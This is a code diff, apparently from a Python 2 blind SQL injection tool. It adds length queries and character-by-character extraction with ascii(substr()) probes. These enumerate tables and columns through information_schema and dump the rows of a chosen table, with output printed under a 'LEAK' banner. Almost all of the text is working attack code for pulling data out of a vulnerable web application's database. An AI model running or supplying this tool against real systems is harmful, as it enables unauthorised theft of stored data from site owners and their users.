@@ -8,7 +8,6 @@ import argparse
 import setting as set
 
 
-
 def blind_based_sql(db_type):
     #First checking table nums
     if set.args.column != "" and set.args.table != "":
@@ -19,23 +18,43 @@ def blind_based_sql(db_type):
         get_cnt_query('t')
 
 def get_data(div,count):
-    print "Finded "+count+" Data"
+    print "Finded "+str(count)+" Data"
     print "============LEAK============"
-    for i in range(0,int(count)):
-        vuln_part = get_data_query(div,i)
-        print set.blind_httpreq(vuln_part)
+    for i in range(0, int(count)):  # getiing a length of data
+        for j in (set.args.column.split(',')):
+            if set.args.column.split(",")[0]<>j:
+                sys.stdout.write(",")
+            global d_column
+            d_column = j
+            pnum = set.blind_httpreq(1,32,get_length_query(div, i))
+            for k in range(1,int(pnum)+1): #getting a data
+                vuln_part = get_data_query(div,i,k)
+                sys.stdout.write(chr(set.blind_httpreq(1,128,vuln_part)))
+        print ""
     print "============================"
 
+def get_length_query(div,count):
+    if div == 't':
+        tlength = "1 and (select length(table_name) from information_schema.tables where table_type='base table' limit 1 offset "+str(count)+")"
+        return tlength
+    elif div == 'c':
+        clength = "1 and (select length(column_name) from information_schema.columns where table_name='"+set.args.table+"' limit 1 offset "+str(count)+")"
+        return clength
+    elif div == 'd':
+        dlength = "1 and (select length("+d_column+") from "+set.args.table+" limit 1 offset "+str(count)+")"
+        return dlength
 
-def get_data_query(div,count):
+
+
+def get_data_query(div,count,pnum):
     if   div == 't':
-        tname  = "(select ascii(substr(table_name,"+str(pnum)+",1)) from information_schema.tables where table_type='base table' limit 1 offset "+str(count)+")"
+        tname  = "1 and (select ascii(substr(table_name,"+str(pnum)+",1)) from information_schema.tables where table_type='base table' limit 1 offset "+str(count)+")"
         return tname
     elif div == 'c':
-        cname = "(select column_name from information_schema.columns where table_name='"+set.args.table+"' limit 1 offset "+str(count)+")"
+        cname = "1 and (select ascii(substr(column_name,"+str(pnum)+",1)) from information_schema.columns where table_name='"+set.args.table+"' limit 1 offset "+str(count)+")"
         return cname
     elif div == 'd':
-        dname = "(select concat_ws(0x2c,"+set.args.column+") from "+set.args.table+" limit 1 offset "+str(count)+")"
+        dname = "1 and (select ascii(substr("+d_column+","+str(pnum)+",1)) from "+set.args.table+" limit 1 offset "+str(count)+")"
         return dname
 
 
@@ -45,12 +64,12 @@ def get_cnt_query(div):
         count  = set.blind_httpreq(1,1024,tcount)
         get_data('t',count)
     elif div == 'c':
-        ccount = "(select count(*) from information_schema.columns where table_name='"+set.args.table+"')"  # column 개수 확인
-        count  = set.blind_httpreq(ccount)
+        ccount = "1 and (select count(*) from information_schema.columns where table_name='"+set.args.table+"')"  # column 개수 확인
+        count  = set.blind_httpreq(1,1024,ccount)
         get_data('c',count)
     elif div == 'd':
-        dcount = "(select count(*) from "+set.args.table+")"                                                #data 개수 확인
-        count  = set.blind_httpreq(dcount)
+        dcount = "1 and (select count(*) from "+set.args.table+")"                                                #data 개수 확인
+        count  = set.blind_httpreq(1,1024,dcount)
         get_data('d',count)
 
 
